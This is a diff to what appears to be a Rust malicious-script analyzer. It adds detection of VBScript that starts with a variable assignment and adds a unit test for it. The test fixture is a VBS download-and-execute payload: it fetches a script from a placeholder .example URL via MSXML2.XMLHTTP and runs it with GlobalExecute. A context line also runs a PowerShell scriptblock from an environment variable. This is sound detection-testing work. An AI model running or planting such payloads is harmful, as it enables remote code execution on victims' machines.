@@ -3729,6 +3729,7 @@ fn starts_like_standalone_vbs(lower: &str) -> bool {
     let first = first_meaningful_script_line(lower);
     first.starts_with("dim ")
         || (first.starts_with("const ") && !looks_like_js_script(lower))
+        || looks_like_vbs_execute_assignment_prefix(first, lower)
         || (first.starts_with("set ") && first.contains("createobject"))
         || (first.starts_with("set ") && first.contains("getobject") && first.contains("winmgmts"))
         || (first.starts_with("with ") && first.contains("createobject"))
@@ -3749,6 +3750,27 @@ fn starts_like_standalone_vbs(lower: &str) -> bool {
         || (first.starts_with("function ") && lower.contains("end function"))
         || (first.starts_with("class ") && lower.contains("end class"))
         || (first.starts_with("if ") && looks_like_office_vbs_startup_save(lower))
+}
+
+fn looks_like_vbs_execute_assignment_prefix(first: &str, lower: &str) -> bool {
+    if looks_like_js_script(lower) || !lower.contains("createobject") {
+        return false;
+    }
+    if !lower.contains("execute") {
+        return false;
+    }
+    let Some((lhs, _rhs)) = first.split_once('=') else {
+        return false;
+    };
+    let lhs = lhs.trim();
+    if lhs.is_empty() {
+        return false;
+    }
+    lhs.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_')
+        && lhs
+            .as_bytes()
+            .first()
+            .is_some_and(|b| b.is_ascii_alphabetic() || *b == b'_')
 }
 
 fn pre_scan_standalone_script_input(input: &[u8], env: &mut Environment) -> bool {
@@ -21822,6 +21844,29 @@ sh.Run "powershell -Command ""&([scriptblock]::Create($env:PAYLOAD))""", 0, Fals
                 .contains("ExecuteGlobal(\"Set http = CreateObject"),
             "standalone VBS source was not preserved in deobfuscated output: {:?}",
             report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_assignment_globalexecute_payload_is_scanned() {
+        let vbs = br#"payload = "Set http = CreateObject(""MSXML2.XMLHTTP""): http.Open ""GET"", ""https://standalone-vbs-globalexecute-var.example/payload.txt"", False: http.Send"
+GlobalExecute payload"#;
+        let report = analyze(vbs, &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. }
+                    if src == "https://standalone-vbs-globalexecute-var.example/payload.txt"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from standalone VBS GlobalExecute variable payload: {:?}",
+            report.traits
+        );
+        assert_eq!(
+            report.extracted_vbs.len(),
+            1,
+            "assignment-first GlobalExecute VBS was not queued as VBS"
         );
     }
 
